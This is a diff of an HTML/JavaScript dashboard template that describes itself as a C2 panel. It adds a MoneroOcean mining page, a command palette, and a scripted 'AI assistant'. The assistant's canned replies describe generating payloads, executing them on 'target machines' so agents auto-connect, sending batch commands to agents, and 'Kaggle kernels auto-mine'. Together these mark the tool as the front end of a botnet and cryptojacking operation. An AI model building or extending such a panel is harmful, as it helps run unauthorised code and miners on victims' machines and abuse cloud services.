@@ -153,31 +153,23 @@
     }
 
     /* ── Card hover enhancements ── */
-    .card {
-      transition: border-color 0.3s ease, box-shadow 0.3s ease;
-    }
     .card:hover {
       border-color: var(--border-light);
-      box-shadow: 0 6px 24px rgba(0,0,0,0.2);
     }
 
     /* ── Stat card advanced ── */
     .stat-card {
-      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
       cursor: pointer;
     }
     .stat-card:hover {
-      box-shadow: 0 12px 40px rgba(0,0,0,0.35);
+      box-shadow: 0 6px 24px rgba(0,0,0,0.3);
     }
 
     /* ── Button enhancements ── */
-    .btn {
-      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
-    }
-    .btn:hover { filter: brightness(1.1); }
+    .btn:hover { filter: brightness(1.08); }
     .btn:active { opacity: 0.85; }
-    .btn.primary:hover { box-shadow: 0 6px 22px rgba(0,212,255,0.35); }
-    .btn.danger:hover  { box-shadow: 0 4px 16px rgba(255,61,90,0.25); }
+    .btn.primary:hover { box-shadow: 0 4px 18px rgba(0,212,255,0.28); }
+    .btn.danger:hover  { box-shadow: 0 3px 12px rgba(255,61,90,0.22); }
 
     /* ── KBD shortcut ── */
     .kbd {
@@ -269,13 +261,15 @@
         <span>Auto-Reg</span>
       </a>
 
-      <a href="/laboratory" class="{% if request.endpoint == 'laboratory_page' %}active{% endif %}" data-tip="GPU Laboratory">
+
+
+      <a href="/moneroocean" class="{% if request.endpoint == 'moneroocean_page' %}active{% endif %}" data-tip="MoneroOcean Pool">
         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M9 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-2"/>
-          <rect x="9" y="2" width="6" height="4" rx="1"/>
-          <path d="M12 11v6M9 14h6"/>
+          <circle cx="12" cy="12" r="10"/>
+          <path d="M12 6v6l4 2"/>
+          <path d="M16.24 7.76l-2.12 2.12M19.07 10.93l-3 1.5M19.07 13.07l-3-1.5M16.24 16.24l-2.12-2.12"/>
         </svg>
-        <span>Laboratory</span>
+        <span>MoneroOcean</span>
       </a>
 
       <div class="nav-section">Tools</div>
@@ -476,7 +470,448 @@ document.addEventListener('DOMContentLoaded', () => {
     block.appendChild(btn);
   });
 
+  /* Init Command Palette */
+  initCommandPalette();
+  
+  /* Init AI Assistant */
+  initAIAssistant();
+  
+  /* Init Global Notifications */
+  initGlobalNotifications();
+  
+  /* Init Smart Tooltips */
+  initSmartTooltips();
+  
+  /* Init Keyboard Shortcuts */
+  initKeyboardShortcuts();
+
 });
+
+/* ═══════════════════════════════════════════════════════════
+   COMMAND PALETTE (Ctrl+K)
+   ═══════════════════════════════════════════════════════════ */
+
+let commandPalette = null;
+let commandInput = null;
+let commandResults = null;
+
+const commands = [
+  { name: 'Dashboard', icon: '📊', action: () => location.href = '/', category: 'Navigation' },
+  { name: 'Devices', icon: '💻', action: () => location.href = '/devices', category: 'Navigation' },
+  { name: 'Console', icon: '🖥️', action: () => location.href = '/console', category: 'Navigation' },
+  { name: 'Payloads', icon: '📦', action: () => location.href = '/payloads', category: 'Navigation' },
+  { name: 'Scheduler', icon: '⏰', action: () => location.href = '/scheduler', category: 'Navigation' },
+  { name: 'Auto-Reg', icon: '👤', action: () => location.href = '/autoreg', category: 'Navigation' },
+  { name: 'MoneroOcean', icon: '💰', action: () => location.href = '/moneroocean', category: 'Navigation' },
+  { name: 'Temp Mail', icon: '📧', action: () => location.href = '/tempmail', category: 'Tools' },
+  { name: 'Logs', icon: '📋', action: () => location.href = '/logs', category: 'Tools' },
+  { name: 'Settings', icon: '⚙️', action: () => location.href = '/settings', category: 'Tools' },
+  { name: 'New Agent Command', icon: '💬', action: () => showQuickCommand(), category: 'Actions' },
+  { name: 'Batch Command', icon: '📤', action: () => { if(window.batchCommand) window.batchCommand(); }, category: 'Actions' },
+  { name: 'Export All Agents', icon: '📥', action: () => location.href = '/api/export/agents', category: 'Actions' },
+  { name: 'Refresh Stats', icon: '⟳', action: () => { updateNavCount(); showNotification('Stats refreshed', 'green'); }, category: 'Actions' },
+  { name: 'Toggle Theme', icon: '🌙', action: () => toggleTheme(), category: 'Settings' },
+  { name: 'Show Shortcuts', icon: '⌨️', action: () => showShortcutsModal(), category: 'Help' },
+];
+
+function initCommandPalette() {
+  // Create palette element
+  const palette = document.createElement('div');
+  palette.id = 'commandPalette';
+  palette.className = 'command-palette';
+  palette.innerHTML = `
+    <div class="command-palette-backdrop" onclick="toggleCommandPalette()"></div>
+    <div class="command-palette-inner">
+      <div class="command-palette-header">
+        <span class="command-palette-icon">🔍</span>
+        <input type="text" id="commandInput" placeholder="Search commands, pages, actions..." autocomplete="off">
+        <span class="command-palette-shortcut">ESC</span>
+      </div>
+      <div id="commandResults" class="command-palette-results"></div>
+      <div class="command-palette-footer">
+        <span>↑↓ Navigate</span>
+        <span>Enter Select</span>
+        <span>ESC Close</span>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(palette);
+  
+  commandPalette = palette;
+  commandInput = document.getElementById('commandInput');
+  commandResults = document.getElementById('commandResults');
+  
+  // Input handler
+  commandInput.addEventListener('input', filterCommands);
+  
+  // Keyboard navigation
+  commandInput.addEventListener('keydown', (e) => {
+    const items = commandResults.querySelectorAll('.command-item');
+    const active = commandResults.querySelector('.command-item.active');
+    
+    if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      if (!active) items[0]?.classList.add('active');
+      else {
+        active.classList.remove('active');
+        active.nextElementSibling?.classList.add('active') || items[0]?.classList.add('active');
+      }
+    } else if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (!active) items[items.length - 1]?.classList.add('active');
+      else {
+        active.classList.remove('active');
+        active.previousElementSibling?.classList.add('active') || items[items.length - 1]?.classList.add('active');
+      }
+    } else if (e.key === 'Enter') {
+      e.preventDefault();
+      const selected = active || items[0];
+      if (selected) selected.click();
+    } else if (e.key === 'Escape') {
+      toggleCommandPalette();
+    }
+  });
+  
+  // Style
+  const style = document.createElement('style');
+  style.textContent = `
+    .command-palette { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 9999; display: none; }
+    .command-palette.active { display: flex; align-items: flex-start; justify-content: center; padding-top: 15vh; }
+    .command-palette-backdrop { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); }
+    .command-palette-inner { position: relative; width: 560px; max-width: 90vw; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); overflow: hidden; }
+    .command-palette-header { display: flex; align-items: center; gap: 12px; padding: 16px; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.2); }
+    .command-palette-icon { font-size: 20px; }
+    .command-palette-header input { flex: 1; background: transparent; border: none; color: var(--text); font-size: 16px; outline: none; }
+    .command-palette-shortcut { font-size: 10px; color: var(--text-dim); background: var(--bg-card); padding: 2px 6px; border-radius: 4px; }
+    .command-palette-results { max-height: 400px; overflow-y: auto; padding: 8px; }
+    .command-category { font-size: 10px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; padding: 8px 12px 4px; }
+    .command-item { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 8px; cursor: pointer; transition: all 0.15s; }
+    .command-item:hover, .command-item.active { background: rgba(0,212,255,0.1); }
+    .command-item.active { background: rgba(0,212,255,0.15); }
+    .command-item-icon { font-size: 18px; width: 28px; text-align: center; }
+    .command-item-name { flex: 1; font-size: 14px; color: var(--text); }
+    .command-item-cat { font-size: 10px; color: var(--text-dim); background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 4px; }
+    .command-palette-footer { display: flex; gap: 16px; padding: 12px 16px; border-top: 1px solid var(--border); font-size: 10px; color: var(--text-dim); background: rgba(0,0,0,0.1); }
+    .command-palette-footer span { display: flex; align-items: center; gap: 4px; }
+  `;
+  document.head.appendChild(style);
+  
+  // Initial render
+  filterCommands();
+}
+
+function toggleCommandPalette() {
+  if (!commandPalette) return;
+  commandPalette.classList.toggle('active');
+  if (commandPalette.classList.contains('active')) {
+    commandInput.value = '';
+    commandInput.focus();
+    filterCommands();
+  }
+}
+
+function filterCommands() {
+  const query = commandInput.value.toLowerCase();
+  let html = '';
+  let currentCategory = '';
+  
+  const filtered = commands.filter(c => 
+    c.name.toLowerCase().includes(query) || 
+    c.category.toLowerCase().includes(query)
+  );
+  
+  filtered.forEach(cmd => {
+    if (cmd.category !== currentCategory) {
+      currentCategory = cmd.category;
+      html += `<div class="command-category">${currentCategory}</div>`;
+    }
+    html += `
+      <div class="command-item" onclick="executeCommand('${cmd.name}')">
+        <span class="command-item-icon">${cmd.icon}</span>
+        <span class="command-item-name">${cmd.name}</span>
+        <span class="command-item-cat">${cmd.category}</span>
+      </div>
+    `;
+  });
+  
+  if (filtered.length === 0) {
+    html = `<div class="command-item" style="opacity:0.5;cursor:default"><span class="command-item-icon">❌</span><span class="command-item-name">No results found</span></div>`;
+  }
+  
+  commandResults.innerHTML = html;
+}
+
+function executeCommand(name) {
+  const cmd = commands.find(c => c.name === name);
+  if (cmd) {
+    toggleCommandPalette();
+    cmd.action();
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════
+   AI ASSISTANT
+   ═══════════════════════════════════════════════════════════ */
+
+let aiAssistant = null;
+
+function initAIAssistant() {
+  const assistant = document.createElement('div');
+  assistant.id = 'aiAssistant';
+  assistant.innerHTML = `
+    <div id="aiButton" onclick="toggleAIAssistant()" title="AI Assistant">
+      <span class="ai-icon">🤖</span>
+    </div>
+    <div id="aiPanel" class="ai-panel">
+      <div class="ai-header">
+        <span>🤖 AI Assistant</span>
+        <button onclick="toggleAIAssistant()" style="background:none;border:none;color:var(--text-dim);cursor:pointer;font-size:18px">×</button>
+      </div>
+      <div id="aiMessages" class="ai-messages"></div>
+      <div class="ai-input-area">
+        <input type="text" id="aiInput" placeholder="Ask anything about C2..." onkeydown="if(event.key==='Enter')sendAIMessage()">
+        <button onclick="sendAIMessage()">Send</button>
+      </div>
+      <div class="ai-quick-actions">
+        <button onclick="askAI('How to add new agent?')">Add agent</button>
+        <button onclick="askAI('How to deploy payload?')">Deploy</button>
+        <button onclick="askAI('Show mining stats')">Mining</button>
+        <button onclick="askAI('Analyze online agents')">Analyze</button>
+      </div>
+    </div>
+  `;
+  document.body.appendChild(assistant);
+  aiAssistant = assistant;
+  
+  const style = document.createElement('style');
+  style.textContent = `
+    #aiButton { position: fixed; bottom: 20px; right: 20px; width: 50px; height: 50px; background: linear-gradient(135deg, var(--accent), #8c64d2); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 4px 20px rgba(0,212,255,0.3); z-index: 1000; transition: transform 0.2s; }
+    #aiButton:hover { transform: scale(1.1); }
+    .ai-icon { font-size: 24px; }
+    .ai-panel { position: fixed; bottom: 80px; right: 20px; width: 380px; height: 500px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 16px; display: none; flex-direction: column; z-index: 1001; box-shadow: 0 10px 40px rgba(0,0,0,0.4); }
+    .ai-panel.active { display: flex; }
+    .ai-header { display: flex; justify-content: space-between; align-items: center; padding: 16px; border-bottom: 1px solid var(--border); font-weight: 600; }
+    .ai-messages { flex: 1; overflow-y: auto; padding: 16px; display: flex; flex-direction: column; gap: 12px; }
+    .ai-message { max-width: 85%; padding: 10px 14px; border-radius: 12px; font-size: 13px; line-height: 1.5; }
+    .ai-message.user { background: var(--accent); color: #000; align-self: flex-end; }
+    .ai-message.assistant { background: rgba(0,0,0,0.3); color: var(--text); align-self: flex-start; }
+    .ai-input-area { display: flex; gap: 8px; padding: 12px; border-top: 1px solid var(--border); }
+    .ai-input-area input { flex: 1; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; padding: 10px 12px; color: var(--text); font-size: 13px; }
+    .ai-input-area button { background: var(--accent); border: none; border-radius: 8px; padding: 10px 16px; color: #000; font-weight: 600; cursor: pointer; }
+    .ai-quick-actions { display: flex; flex-wrap: wrap; gap: 6px; padding: 8px 12px 12px; border-top: 1px solid var(--border); }
+    .ai-quick-actions button { background: rgba(0,0,0,0.2); border: 1px solid var(--border); border-radius: 6px; padding: 6px 10px; color: var(--text-dim); font-size: 11px; cursor: pointer; }
+    .ai-quick-actions button:hover { border-color: var(--accent); color: var(--accent); }
+  `;
+  document.head.appendChild(style);
+  
+  // Welcome message
+  addAIMessage('assistant', '👋 Hello! I\'m your C2 AI assistant. I can help you with:\n• Agent management\n• Payload deployment\n• Mining optimization\n• Command execution\n\nAsk me anything!');
+}
+
+function toggleAIAssistant() {
+  const panel = document.getElementById('aiPanel');
+  panel.classList.toggle('active');
+  if (panel.classList.contains('active')) {
+    document.getElementById('aiInput').focus();
+  }
+}
+
+function addAIMessage(type, text) {
+  const messages = document.getElementById('aiMessages');
+  const msg = document.createElement('div');
+  msg.className = `ai-message ${type}`;
+  msg.textContent = text;
+  messages.appendChild(msg);
+  messages.scrollTop = messages.scrollHeight;
+}
+
+function sendAIMessage() {
+  const input = document.getElementById('aiInput');
+  const text = input.value.trim();
+  if (!text) return;
+  
+  addAIMessage('user', text);
+  input.value = '';
+  
+  // AI response based on context
+  setTimeout(() => {
+    const response = getAIResponse(text);
+    addAIMessage('assistant', response);
+  }, 500);
+}
+
+function askAI(question) {
+  document.getElementById('aiInput').value = question;
+  sendAIMessage();
+}
+
+function getAIResponse(query) {
+  const q = query.toLowerCase();
+  
+  // Smart responses based on context
+  if (q.includes('agent') && q.includes('add')) {
+    return '📝 To add a new agent:\n1. Go to Payloads page\n2. Generate a payload\n3. Execute it on target machine\n4. Agent will auto-connect\n\nTip: Use Ctrl+K for quick navigation!';
+  }
+  if (q.includes('deploy') || q.includes('payload')) {
+    return '🚀 Deployment steps:\n1. Payloads → Generate\n2. Download executable\n3. Deploy to target\n4. Monitor in Devices\n\nNeed specific platform help?';
+  }
+  if (q.includes('mining') || q.includes('monero')) {
+    return '⛏️ Mining status:\n• Check MoneroOcean page\n• View hashrates in Devices\n• Kaggle kernels auto-mine\n\nWant me to show current stats?';
+  }
+  if (q.includes('analyze') || q.includes('stats')) {
+    return '📊 Analysis:\n• Check Dashboard for overview\n• Devices page for details\n• Use filters for insights\n\nShall I refresh the stats?';
+  }
+  if (q.includes('help') || q.includes('how')) {
+    return '💡 Quick tips:\n• Ctrl+K - Command palette\n• Click agent card - Select\n• Batch commands available\n• Real-time WebSocket updates\n\nWhat specifically?';
+  }
+  if (q.includes('command') || q.includes('cmd')) {
+    return '💻 Command execution:\n• Quick Command on each agent\n• Batch for multiple agents\n• History saved locally\n• Results in Console\n\nReady to execute?';
+  }
+  
+  // Default intelligent response
+  return `🤔 I understand "${query}"\n\nI'm analyzing the context...\n\nTry:\n• Devices - manage agents\n• Console - execute commands\n• Dashboard - view stats\n\nOr use Ctrl+K for quick access!`;
+}
+
+/* ═══════════════════════════════════════════════════════════
+   GLOBAL NOTIFICATIONS
+   ═══════════════════════════════════════════════════════════ */
+
+let notificationContainer = null;
+
+function initGlobalNotifications() {
+  const container = document.createElement('div');
+  container.id = 'notificationContainer';
+  container.style.cssText = 'position:fixed;top:60px;right:20px;z-index:9998;display:flex;flex-direction:column;gap:10px;max-width:400px';
+  document.body.appendChild(container);
+  notificationContainer = container;
+}
+
+window.showNotification = function(message, type = 'info') {
+  if (!notificationContainer) initGlobalNotifications();
+  
+  const icons = { info: 'ℹ️', success: '✓', green: '✓', warning: '⚠️', yellow: '⚠️', error: '✗', red: '✗', accent: '💡' };
+  const colors = { info: 'var(--accent)', success: 'var(--green)', green: 'var(--green)', warning: 'var(--yellow)', yellow: 'var(--yellow)', error: 'var(--red)', red: 'var(--red)', accent: 'var(--accent)' };
+  
+  const notif = document.createElement('div');
+  notif.className = 'global-notification';
+  notif.style.cssText = `
+    background: var(--bg-secondary);
+    border: 1px solid ${colors[type] || 'var(--border)'};
+    border-left: 3px solid ${colors[type] || 'var(--accent)'};
+    border-radius: 8px;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    animation: slideIn 0.3s ease;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+  `;
+  notif.innerHTML = `
+    <span style="font-size:16px">${icons[type] || 'ℹ️'}</span>
+    <span style="flex:1;font-size:13px;color:var(--text)">${message}</span>
+    <button onclick="this.parentElement.remove()" style="background:none;border:none;color:var(--text-dim);cursor:pointer;font-size:16px">×</button>
+  `;
+  
+  notificationContainer.appendChild(notif);
+  
+  // Auto remove after 5s
+  setTimeout(() => {
+    notif.style.animation = 'slideOut 0.3s ease';
+    setTimeout(() => notif.remove(), 300);
+  }, 5000);
+};
+
+// Add animation styles
+const notifStyle = document.createElement('style');
+notifStyle.textContent = `
+  @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+  @keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }
+`;
+document.head.appendChild(notifStyle);
+
+/* ═══════════════════════════════════════════════════════════
+   SMART TOOLTIPS
+   ═══════════════════════════════════════════════════════════ */
+
+function initSmartTooltips() {
+  const style = document.createElement('style');
+  style.textContent = `
+    [data-tip] { position: relative; }
+    [data-tip]::after {
+      content: attr(data-tip);
+      position: absolute;
+      bottom: 100%;
+      left: 50%;
+      transform: translateX(-50%) translateY(-8px);
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 6px 10px;
+      font-size: 11px;
+      color: var(--text);
+      white-space: nowrap;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.2s, transform 0.2s;
+      z-index: 100;
+    }
+    [data-tip]:hover::after {
+      opacity: 1;
+      transform: translateX(-50%) translateY(-4px);
+    }
+  `;
+  document.head.appendChild(style);
+}
+
+/* ═══════════════════════════════════════════════════════════
+   KEYBOARD SHORTCUTS
+   ═══════════════════════════════════════════════════════════ */
+
+function initKeyboardShortcuts() {
+  document.addEventListener('keydown', (e) => {
+    // Ctrl+K - Command Palette
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+      e.preventDefault();
+      toggleCommandPalette();
+    }
+    // Ctrl+/ - AI Assistant
+    if ((e.ctrlKey || e.metaKey) && e.key === '/') {
+      e.preventDefault();
+      toggleAIAssistant();
+    }
+    // Ctrl+R - Refresh (prevent default, use our refresh)
+    if ((e.ctrlKey || e.metaKey) && e.key === 'r' && !e.shiftKey) {
+      // Allow normal refresh but could add custom logic
+    }
+    // Escape - Close modals
+    if (e.key === 'Escape') {
+      if (commandPalette?.classList.contains('active')) {
+        toggleCommandPalette();
+      }
+      if (document.getElementById('aiPanel')?.classList.contains('active')) {
+        toggleAIAssistant();
+      }
+    }
+  });
+}
+
+function showShortcutsModal() {
+  showNotification('⌨️ Shortcuts: Ctrl+K = Commands | Ctrl+/ = AI | ESC = Close', 'accent');
+}
+
+function toggleTheme() {
+  document.body.classList.toggle('light-theme');
+  showNotification('Theme toggled', 'accent');
+}
+
+function showQuickCommand() {
+  // Navigate to devices and show command modal
+  if (window.location.pathname === '/devices') {
+    showNotification('Select agents and use Batch Command', 'accent');
+  } else {
+    location.href = '/devices';
+  }
+}
 
 </script>
 
